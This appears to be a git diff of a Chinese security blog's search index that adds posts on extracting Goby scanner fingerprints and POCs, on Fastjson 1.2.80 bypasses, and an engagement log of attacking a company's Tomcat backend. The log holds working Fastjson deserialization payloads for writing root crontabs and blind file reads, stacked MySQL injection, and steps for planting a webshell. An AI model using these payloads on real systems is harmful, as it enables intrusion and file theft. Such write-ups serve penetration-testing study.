@@ -1421,6 +1421,259 @@ https://github.com/dvyukov/go-fuzz
       </tags>
   </entry>
   <entry>
+    <title>Goby指纹与POC提取复现</title>
+    <url>//post/Goby%E6%8C%87%E7%BA%B9%E5%92%8CPOC%E6%8F%90%E5%8F%96.html</url>
+    <content><![CDATA[Goby指纹与POC提取复现最近看了w8ay师傅发的关于提取Goby指纹的帖子，发现自己加入师傅的知识星球却一直没认真学习过实在是难顶嗷，根据师傅的帖子来复现自己提取一下，补上第一期的作业。
+Goby指纹提取首先是指纹提取，这里也分别准备了三个版本的Goby文件进行复现，分别是1.4.76、1.7.192和1.8.279
+1.4.76因为版本比较低所以不需要我们手动去从goby程序里提crules，直接用winhex打开笔者从事的工作与Yara息息相关，但是从来没有深入的去了解Yara的原理和流程，只是把它当作加强版的正则，从来没有想过能用来进行指纹识别，愧疚愧疚~~
+到这里已经看到出现指纹了，接下来就是将指纹提取出来，笔者在复现的时候起初以为自己写过Yara规则，猜测每个规则都是rule_id开头，然后后面跟字段，妹有好好观察，最后还是老老实实寻找开始和结束段。我们提取的内容应该是以rules_0开始，按照师傅的文章正是从default之后开始进行提取，所以开始字段为64 65 66 61 75 6C 74 00 ，往下寻找结束的标记，从图上可以看出结束的标记为66 6F 65 79 65
+接下来就是将这两段之间的内容提取出来，笔者最近正好在学习Go，就用Go写了个辣眼的提取脚本
+package main
+
+import (
+&nbsp; &nbsp; "io/ioutil"
+&nbsp; &nbsp; "fmt"
+&nbsp; &nbsp; "strings"
+&nbsp; &nbsp; "os"
+)
+
+func Read()(string){
+&nbsp; &nbsp; f, err := ioutil.ReadFile("/home/ubuntu/go/gopro/crules")
+&nbsp; &nbsp; if err != nil {
+&nbsp; &nbsp; &nbsp; &nbsp; fmt.Println("read fail", err)
+&nbsp; &nbsp; }
+&nbsp; &nbsp; return string(f)
+}
+
+func Write(s string) &nbsp;{
+&nbsp; &nbsp; fileName := "finger.txt"
+&nbsp; &nbsp; var d1 = []byte(s)
+&nbsp; &nbsp; f, err3 := os.Create(fileName) //创建文件
+&nbsp; &nbsp; if err3 != nil{
+&nbsp; &nbsp; &nbsp; &nbsp; fmt.Println("create file fail")
+&nbsp; &nbsp; }
+&nbsp; &nbsp; defer f.Close()
+&nbsp; &nbsp; n2, err3 := f.Write(d1) //写入文件(字节数组)
+&nbsp; &nbsp; fmt.Printf("写入 %d 个字节n", n2)
+&nbsp; &nbsp; f.Sync()
+}
+
+func main() {
+&nbsp; &nbsp; crules := Read()
+&nbsp; &nbsp; start := strings.Index(crules, "\x64\x65\x66\x61\x75\x6C\x74\x00")
+&nbsp; &nbsp; end := strings.Index(crules, "\x00\x00\x66\x6F\x65\x79\x65\x00")
+&nbsp; &nbsp; finger := crules[start : end]
+&nbsp; &nbsp; Write(finger)
+}
+
+
+真的辣眼睛，因为妹有做分割，真没眼看。。。。
+接下来就是进行分割，观察不同的rule_id之间的字节
+由此可以确定不同规则rule_id之间的分隔符为\x00\x00\x00\x00\x73\x00 ,不同字段之间的分隔符为\x00 
+尝试对其进行拆分，这段写得太辣眼睛了，还是放师傅的脚本吧
+filename = r"crules"
+with open(filename, 'rb') as f:
+&nbsp; &nbsp; data = f.read()
+start = data.index(b"default\x00fofa")
+end = data.index(b"\x00" * 16, start)
+data = data[start:end]
+datas = data.split(b"rule_id")[1:]
+sep = b"\x00"
+options_set = set()
+results = []
+for item in datas:
+&nbsp; &nbsp; ff = item.split(sep)
+&nbsp; &nbsp; rule_id = ff[1].decode()
+&nbsp; &nbsp; level = ff[3].decode()
+&nbsp; &nbsp; softhard = ff[5].decode()
+&nbsp; &nbsp; product = ff[7].decode()
+&nbsp; &nbsp; company = ff[9].decode()
+&nbsp; &nbsp; category = ff[11].decode()
+&nbsp; &nbsp; parent_category = ff[13].decode()
+&nbsp; &nbsp; dd = {
+&nbsp; &nbsp; &nbsp; &nbsp; "rule_id": rule_id,
+&nbsp; &nbsp; &nbsp; &nbsp; "level": level,
+&nbsp; &nbsp; &nbsp; &nbsp; "softhard": softhard,
+&nbsp; &nbsp; &nbsp; &nbsp; "product": product,
+&nbsp; &nbsp; &nbsp; &nbsp; "company": company,
+&nbsp; &nbsp; &nbsp; &nbsp; "category": category,
+&nbsp; &nbsp; &nbsp; &nbsp; "parent_category": parent_category,
+&nbsp; &nbsp; &nbsp; &nbsp; "rules": []
+&nbsp; &nbsp; }
+&nbsp; &nbsp; bb = b'\x00'.join(ff[14:])
+&nbsp; &nbsp; s = bb.split(b'\x00\x00\x00\x00\x73\x00')
+&nbsp; &nbsp; _rr2 = []
+&nbsp; &nbsp; for rr in s:
+&nbsp; &nbsp; &nbsp; &nbsp; _rules = []
+&nbsp; &nbsp; &nbsp; &nbsp; if not rr.startswith(b'fofa'):
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; continue
+&nbsp; &nbsp; &nbsp; &nbsp; index = 0
+&nbsp; &nbsp; &nbsp; &nbsp; while index &lt; len(rr):
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; prefixx = b"fofa\x00"
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; try:
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; start = rr.index(prefixx, index) + len(prefixx)
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; except:
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; end = rr.index(b'\x00', start)
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; match_way = rr[start:end].decode()
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; _length = rr[end + 1]
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; content = rr[end + 9:end + 9 + _length]
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; index = end + 9 + _length
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; _rules.append(
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "match": match_way,
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "content": content.decode('utf-8', errors="ignore")
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; )
+&nbsp; &nbsp; &nbsp; &nbsp; _rr2.append(_rules)
+&nbsp; &nbsp; dd["rules"] = _rr2
+&nbsp; &nbsp; results.append(dd)
+print(results)
+with open("fofa.json", "w", encoding="utf-8") as f:
+&nbsp; &nbsp; import json
+&nbsp; &nbsp; json.dump(results, f, ensure_ascii=False, indent=4)
+
+最后得到结果如下
+
+1.7.1921.7.192版本不在含有crules文件，它被包含在了可执行程序中，打开可执行程序可以看到其中引用了github.com/rakyll/statik/fs 库，官方的描述如下：statik allows you to embed a directory of static files into your Go binary根据师傅的文章，我们也可以查看fs的源码fs.go的源码发现该库即是生成了ZIP内嵌在程序中笔者之前有过一些Misc经验（雾，这里列出常见的文件头
+
+
+
+Type
+文件头
+文件尾
+
+
+
+JEPG
+FFD8FF
+FFD9
+
+
+PNG
+89504E47
+AE426082
+
+
+GIF
+47484638
+003B
+
+
+ZIP
+504B0304
+504B
+
+
+TIFF
+49492A00
+
+
+
+XML
+68746D6C3E
+
+
+
+PDF
+25504446
+
+
+
+RAR
+52617221
+
+
+
+这里搜索ZIP的格式头50 4B 03 04 即可定位到压缩包的起始位置
+
+看到crules，就应该是这个压缩包了，接下来就是寻找结尾进行提取压缩包文件。因为50 4B 03 04 这段数据在文本中有很多，在进行提取的时候可以多选几个字节进行准确定位，这里师傅网友多定了一个字节到50 4B 03 04 14 00 08 00 08 00
+接下来寻找压缩包结尾，先看看50 4B 的搜索结果
+在搜索开始头的时候就能看到存在这么多的50 4B 如果直接提取到下一个50 4B 无法判断压缩包的准确性，借鉴师傅的解决方法，每次读字节并且尝试解压，代码如下：
+# @Author &nbsp;: w8ay
+import zipfile
+from io import BytesIO
+
+filename = "goby-cmd-linux"
+with open(filename, 'rb') as stream:
+&nbsp; &nbsp; data = stream.read()
+&nbsp; &nbsp; start = data.find(b'\x50\x4B\x03\x04\x14\x00\x08\x00\x08\x00')
+&nbsp; &nbsp; end = start + 1200
+while True:
+&nbsp; &nbsp; fenli = data[start:end]
+&nbsp; &nbsp; try:
+&nbsp; &nbsp; &nbsp; &nbsp; fio = BytesIO(fenli)
+&nbsp; &nbsp; &nbsp; &nbsp; f = zipfile.ZipFile(file=fio)
+&nbsp; &nbsp; &nbsp; &nbsp; print(fenli[:100])
+&nbsp; &nbsp; &nbsp; &nbsp; print(fenli[-10:])
+&nbsp; &nbsp; &nbsp; &nbsp; print(len(fenli) // 1024)
+&nbsp; &nbsp; &nbsp; &nbsp; print(f.namelist())
+&nbsp; &nbsp; &nbsp; &nbsp; break
+&nbsp; &nbsp; except zipfile.BadZipFile:
+&nbsp; &nbsp; &nbsp; &nbsp; end += 1
+with open("test.zip", 'wb') as f:
+&nbsp; &nbsp; f.write(fenli)
+
+成功分离出crules_1.7.192，用之前的提取脚本提取即可
+这个微微离谱的指纹还在
+
+Goby Poc提取Goby的POC分为json与go两种格式，本次只尝试提取json’格式（wtcldbq
+用winhex打开可执行程序观察
+
+可以直接确认Name段，那么提取数据的起始段也可以确认为\x23\x7B\x0A\x20\x20\x22\x4E\x61\x6D\x65\x22\x3A\x20（在看的时候搜索Name字段第二个处的CS字段与下面不同，不知道为啥师傅没有提取结束段标记为\x65\x0A\x7D\x0A\x66\x75\x6E\x63\x74\x69\x6F\x6E
+暴力提取辣眼脚本：
+package main
+
+import (
+&nbsp; &nbsp; "io/ioutil"
+&nbsp; &nbsp; "fmt"
+&nbsp; &nbsp; "strings"
+&nbsp; &nbsp; "os"
+)
+
+func Read()(string){
+&nbsp; &nbsp; f, err := ioutil.ReadFile("goby_1.8")
+&nbsp; &nbsp; if err != nil {
+&nbsp; &nbsp; &nbsp; &nbsp; fmt.Println("read fail", err)
+&nbsp; &nbsp; }
+&nbsp; &nbsp; return string(f)
+}
+
+func Write(s string) {
+&nbsp; &nbsp; fileName := "finger.json"
+&nbsp; &nbsp; var d1 = []byte(s)
+&nbsp; &nbsp; f, err3 := os.Create(fileName) //创建文件
+&nbsp; &nbsp; if err3 != nil{
+&nbsp; &nbsp; &nbsp; &nbsp; fmt.Println("create file fail")
+&nbsp; &nbsp; }
+&nbsp; &nbsp; defer f.Close()
+&nbsp; &nbsp; n2, err3 := f.Write(d1) //写入文件(字节数组)
+&nbsp; &nbsp; fmt.Printf("写入 %d 个字节n", n2)
+&nbsp; &nbsp; f.Sync()
+}
+
+func main() {
+&nbsp; &nbsp; crules := Read()
+&nbsp; &nbsp; start := strings.Index(crules, "\x23\x7B\x0A\x20\x20\x22\x4E\x61\x6D\x65\x22\x3A\x20")
+&nbsp; &nbsp; end := strings.Index(crules, "\x65\x0A\x7D\x0A\x66\x75\x6E\x63\x74\x69\x6F\x6E")
+&nbsp; &nbsp; finger := crules[start + 1 : end + 3]
+&nbsp; &nbsp; Write(finger)
+}
+
+提取结果如下
+但是存在一些不可见字符干扰，后续再优化
+总结首先是 W8ay师傅太强了orz，后面到了逆向yara虚拟机的程度，对字符处理也很细节，学，学无止境。wtcl。。
+以后要忠实的做好每一个大佬的舔狗
+
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux Kernel 保护机制绕过</title>
     <url>//post/Linux%20Kernel%20%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87.html</url>
     <content><![CDATA[Linux Kernel 保护机制绕过
@@ -2666,105 +2919,6 @@ iU：已进入 apt 安装队列，但还未被安装（不可移除）
       </tags>
   </entry>
   <entry>
-    <title>一次攻防小记</title>
-    <url>//post/%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E5%B0%8F%E8%AE%B0.html</url>
-    <content><![CDATA[一次攻防小记​  一次攻防，第一天师傅rmi直接进了总公司内网，笔者在核心资产段打了好久没能进去，水了几天边缘分公司，队长又让打核心段，看看之前的一些弱口令，后台能不能后续利用，没办法硬着头皮打。​  这个弱口令属于那种爆破可以爆破出的，但是随手试肯定不会试的，后台功能点比较多，但是生产也不敢乱动，之前师傅进后台挖过，找到了个跨目录上传和文件读取（都仅限jpg后缀），笔者经过细挖，找到个sql注入（mysql，支持堆叠，mysql用户权限较低）和fastjson（1.2.47&lt;版本&lt;1.2.68)，fatjson利用点只有两种响应，成功和失败，中间间是tomcat，不出网，然后开始尝试getshell。
-fastjson利用随手一试fastjson jdk8 写文件的链
-{ "x":{
-        "@type":"java.lang.AutoCloseable", 
-        "@type":"sun.rmi.server.MarshalOutputStream",
-        "out":{
-            "@type":"java.util.zip.InflaterOutputStream",
-            "out":{
-                "@type":"java.io.FileOutputStream",
-                "file":"/var/spool/cron/crontabs/root",
-                "append":false
-            },
-            "infl":{
-                "input":"eJzTUtCCwswUBTsF_ZLcAv2U1OJivayCdABYLgeL"
-            },
-            "bufLen":1048576
-        },
-        "protocolVersion":1
-    }}
-
-压缩数据生成
-from itsdangerous import base64_decode, base64_encode
-import zlib
-cc='hello'.encode()
-ccc=zlib.compress(cc)
-print(base64_encode(ccc))
-
-居然成功了，写个jpg，用上面的文件读取也能读到写入的文件，当时就感觉有机会，但是苦于没有路径，然后试commons-io 发现存在依赖，尝试读文件的链子
-{
-  "abc":{"@type": "java.lang.AutoCloseable",
-    "@type": "org.apache.commons.io.input.BOMInputStream",
-    "delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",
-      "reader": { "@type": "jdk.nashorn.api.scripting.URLReader",
-        "url": "file:///tmp/"
-      },
-      "charsetName": "UTF-8",
-      "bufferSize": 1024
-    },"boms": [
-      {
-        "@type": "org.apache.commons.io.ByteOrderMark",
-        "charsetName": "UTF-8",
-        "bytes": [
-          ...
-        ]
-      }
-    ]
-  },
-  "address" : {"$ref":"$.abc.BOM"}
-}
-
-但是没有回显，无法判断，随后拜读浅蓝师傅的文章 https://b1ue.cn/archives/506.html
-前面读文件的链子bytes和读的文件匹配，getBOM会返回这个bytes，然后下面利用类型不匹配，让fastjson报错，服务器返回“错误”，来实现盲注读文件
-通过读/root/.bash_history等拿到tomcat路径
-{
-  "abc":{"@type": "java.lang.AutoCloseable",
-    "@type": "org.apache.commons.io.input.BOMInputStream",
-    "delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",
-      "reader": { "@type": "jdk.nashorn.api.scripting.URLReader",
-        "url": "file:///tmp/test"
-      },
-      "charsetName": "UTF-8",
-      "bufferSize": 1024
-    },"boms": [
-      {
-        "@type": "org.apache.commons.io.ByteOrderMark",
-        "charsetName": "UTF-8",
-        "bytes": [
-          98
-        ]
-      }
-    ]
-  },
-  "address" : {"@type": "java.lang.AutoCloseable","@type":"org.apache.commons.io.input.CharSequenceReader","charSequence": {"@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"},"start": 0,"end": 0}
-}
-
-但是很可惜，实战环境有点复杂，经过小修改之后链子只能用来探测路径或文件是否存在，无论如何类型匹配那都不报错，笔者尝试不读文件进行对比，直接返回byte，实战环境也不报错，只能fuzz一下tomcat路径，也没fuzz出来，gg。
-写计划任务试了一下写计划任务，/var/spool/cron/root写不进去，很奇怪（后来发现是队长开始写了一次，写进去了，但是语法有问题，文件不知道为啥被锁了，后来就写不进去了，覆盖追加都不行），尝试其他用户常见用户名也都失败，用mysql读了一下安装路径，发现是/home/soft ,写/var/spool/cron/soft ，也没执行，窒息.jpg。
-SQL注入fastjson没啥看了，去深入一下注入，发现可以堆叠，在secure-file-priv=NULL时，可以尝试下面这种方法读文件 ,很全的一篇mysql注入文章 https://xz.aliyun.com/t/7169#toc-32
-drop table mysql.m1;
-CREATE TABLE mysql.m1 (code TEXT );
-LOAD DATA LOCAL INFILE 'D://1.txt' INTO TABLE mysql.m1 fields terminated by '';
-select * from mysql.m1;
-
-可惜还是不行，后来才知道在local_infile变量开启时候这种方法才可以读到文件，另外这站还是站库分离，mysql在阿里云上，当时竟然没测一下，浪费了不少时间，还是菜，当然这都是后话，泪.jpg。到现在没得其他思路了，而且这个站已经搞了好几天了，也没搞下来，太菜了呜呜呜。
-二战过了两天又来日这个站，另一个师傅扫了一下目录，发现个nginx的配置文件，配置文件可以看出这个站的后台接口是被代理到另一个内网服务器，配置文件里还发现个转发服务器地址，它刚好有个druid，刚好是个弱口令，主页看到classpath，/root/soft/apache-tomcatxxxxxx（xxxxx为版本号） ,刚好这个站也有个soft用户，回去一试，/home/soft/apache-tomcatxxxxx路径存在！！！！！！！！！！！！！随后就是写shell了，不知道为啥完整的shell压缩之后用fastjson写进去会报错，把shell分成几部分追加写，写文件链子里的append false改为true。附一个笔者常用的在没有waf的情况下检测fastjosn的小技巧，json数据里，加上 
-"@type":"xxxx"
-
-一般是fatjson就会报错，这次这个站就是这么发现的，后台接口很多，但是只有这一个地方的一个参数传的是json数据,也不出网。小总结一下吧，端口要扫全，弱口令都要试一下，能爆破就爆破，目录该扫也要扫，毕竟渗透本质是信息收集。
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Webshell工具加密流量解析</title>
     <url>//post/Webshell%E5%B7%A5%E5%85%B7%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E8%A7%A3%E6%9E%90.html</url>
     <content><![CDATA[前言webshell管理工具作为进一步信息收集、内网渗透、获取更高权限等功能的好帮手，常出现在攻防对抗和渗透测试场景下，其自带的流量加密用来绕过其waf、ids等安全设备的连接，这里简单说下蚁剑、哥斯拉、冰蝎3.0这三款较为流行的工具在默认情况下的流量加密方式和解密方法，可以帮助守方在复盘时更好的攻击链还原和检测。
@@ -3119,6 +3273,127 @@ http://www.wjhsh.net/0daybug-p-12004574.html
       <categories>
         <category>渗透测试</category>
       </categories>
+  </entry>
+  <entry>
+    <title>Fastjson 1.2.80调试小记</title>
+    <url>//post/fastjson%201.2.80%E8%B0%83%E8%AF%95%E5%B0%8F%E8%AE%B0.html</url>
+    <content><![CDATA[fastjson 1.2.80 调试小记先膜一下浅蓝师傅，在1.2.80的绕过中主要是通过setter方法参数 、public field 、构造方法的参数 类加白 ，再用加白的类来构造gadget。笔者在复现时发现，不同的加白方法适用于不同的版本范围，遂有了这篇调试小记。
+1.2.73-1.2.80setter方法参数 &amp; public field 加白
+
+https://github.com/alibaba/fastjson/compare/1.2.72...1.2.73
+1.2.76-1.2.80构造方法的参数加白
+
+https://github.com/alibaba/fastjson/compare/1.2.75...1.2.76
+poc来自于 https://github.com/hosch3n/FastjsonVulns同时感谢这位师傅为笔者指出 75到76的代码变化
+最后再分享一个浅蓝师傅说的绕waf 方式 ，笔者刚用这种方式绕waf成功打入核心，并且此方法适用的版本较广，低版本的fastjson也可以用
+{'@type':xjava.lang.Class"}
+
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>一次攻防小记</title>
+    <url>//post/%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E5%B0%8F%E8%AE%B0.html</url>
+    <content><![CDATA[一次攻防小记​  一次攻防，第一天师傅rmi直接进了总公司内网，笔者在核心资产段打了好久没能进去，水了几天边缘分公司，队长又让打核心段，看看之前的一些弱口令，后台能不能后续利用，没办法硬着头皮打。​  这个弱口令属于那种爆破可以爆破出的，但是随手试肯定不会试的，后台功能点比较多，但是生产也不敢乱动，之前师傅进后台挖过，找到了个跨目录上传和文件读取（都仅限jpg后缀），笔者经过细挖，找到个sql注入（mysql，支持堆叠，mysql用户权限较低）和fastjson（1.2.47&lt;版本&lt;1.2.68)，fatjson利用点只有两种响应，成功和失败，中间间是tomcat，不出网，然后开始尝试getshell。
+fastjson利用随手一试fastjson jdk8 写文件的链
+{ "x":{
+        "@type":"java.lang.AutoCloseable", 
+        "@type":"sun.rmi.server.MarshalOutputStream",
+        "out":{
+            "@type":"java.util.zip.InflaterOutputStream",
+            "out":{
+                "@type":"java.io.FileOutputStream",
+                "file":"/var/spool/cron/crontabs/root",
+                "append":false
+            },
+            "infl":{
+                "input":"eJzTUtCCwswUBTsF_ZLcAv2U1OJivayCdABYLgeL"
+            },
+            "bufLen":1048576
+        },
+        "protocolVersion":1
+    }}
+
+压缩数据生成
+from itsdangerous import base64_decode, base64_encode
+import zlib
+cc='hello'.encode()
+ccc=zlib.compress(cc)
+print(base64_encode(ccc))
+
+居然成功了，写个jpg，用上面的文件读取也能读到写入的文件，当时就感觉有机会，但是苦于没有路径，然后试commons-io 发现存在依赖，尝试读文件的链子
+{
+  "abc":{"@type": "java.lang.AutoCloseable",
+    "@type": "org.apache.commons.io.input.BOMInputStream",
+    "delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",
+      "reader": { "@type": "jdk.nashorn.api.scripting.URLReader",
+        "url": "file:///tmp/"
+      },
+      "charsetName": "UTF-8",
+      "bufferSize": 1024
+    },"boms": [
+      {
+        "@type": "org.apache.commons.io.ByteOrderMark",
+        "charsetName": "UTF-8",
+        "bytes": [
+          ...
+        ]
+      }
+    ]
+  },
+  "address" : {"$ref":"$.abc.BOM"}
+}
+
+但是没有回显，无法判断，随后拜读浅蓝师傅的文章 https://b1ue.cn/archives/506.html
+前面读文件的链子bytes和读的文件匹配，getBOM会返回这个bytes，然后下面利用类型不匹配，让fastjson报错，服务器返回“错误”，来实现盲注读文件
+通过读/root/.bash_history等拿到tomcat路径
+{
+  "abc":{"@type": "java.lang.AutoCloseable",
+    "@type": "org.apache.commons.io.input.BOMInputStream",
+    "delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",
+      "reader": { "@type": "jdk.nashorn.api.scripting.URLReader",
+        "url": "file:///tmp/test"
+      },
+      "charsetName": "UTF-8",
+      "bufferSize": 1024
+    },"boms": [
+      {
+        "@type": "org.apache.commons.io.ByteOrderMark",
+        "charsetName": "UTF-8",
+        "bytes": [
+          98
+        ]
+      }
+    ]
+  },
+  "address" : {"@type": "java.lang.AutoCloseable","@type":"org.apache.commons.io.input.CharSequenceReader","charSequence": {"@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"},"start": 0,"end": 0}
+}
+
+但是很可惜，实战环境有点复杂，经过小修改之后链子只能用来探测路径或文件是否存在，无论如何类型匹配那都不报错，笔者尝试不读文件进行对比，直接返回byte，实战环境也不报错，只能fuzz一下tomcat路径，也没fuzz出来，gg。
+写计划任务试了一下写计划任务，/var/spool/cron/root写不进去，很奇怪（后来发现是队长开始写了一次，写进去了，但是语法有问题，文件不知道为啥被锁了，后来就写不进去了，覆盖追加都不行），尝试其他用户常见用户名也都失败，用mysql读了一下安装路径，发现是/home/soft ,写/var/spool/cron/soft ，也没执行，窒息.jpg。
+SQL注入fastjson没啥看了，去深入一下注入，发现可以堆叠，在secure-file-priv=NULL时，可以尝试下面这种方法读文件 ,很全的一篇mysql注入文章 https://xz.aliyun.com/t/7169#toc-32
+drop table mysql.m1;
+CREATE TABLE mysql.m1 (code TEXT );
+LOAD DATA LOCAL INFILE 'D://1.txt' INTO TABLE mysql.m1 fields terminated by '';
+select * from mysql.m1;
+
+可惜还是不行，后来才知道在local_infile变量开启时候这种方法才可以读到文件，另外这站还是站库分离，mysql在阿里云上，当时竟然没测一下，浪费了不少时间，还是菜，当然这都是后话，泪.jpg。到现在没得其他思路了，而且这个站已经搞了好几天了，也没搞下来，太菜了呜呜呜。
+二战过了两天又来日这个站，另一个师傅扫了一下目录，发现个nginx的配置文件，配置文件可以看出这个站的后台接口是被代理到另一个内网服务器，配置文件里还发现个转发服务器地址，它刚好有个druid，刚好是个弱口令，主页看到classpath，/root/soft/apache-tomcatxxxxxx（xxxxx为版本号） ,刚好这个站也有个soft用户，回去一试，/home/soft/apache-tomcatxxxxx路径存在！！！！！！！！！！！！！随后就是写shell了，不知道为啥完整的shell压缩之后用fastjson写进去会报错，把shell分成几部分追加写，写文件链子里的append false改为true。附一个笔者常用的在没有waf的情况下检测fastjosn的小技巧，json数据里，加上 
+"@type":"xxxx"
+
+一般是fatjson就会报错，这次这个站就是这么发现的，后台接口很多，但是只有这一个地方的一个参数传的是json数据,也不出网。小总结一下吧，端口要扫全，弱口令都要试一下，能爆破就爆破，目录该扫也要扫，毕竟渗透本质是信息收集。
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
   </entry>
   <entry>
     <title>容器进程切换漏洞</title>
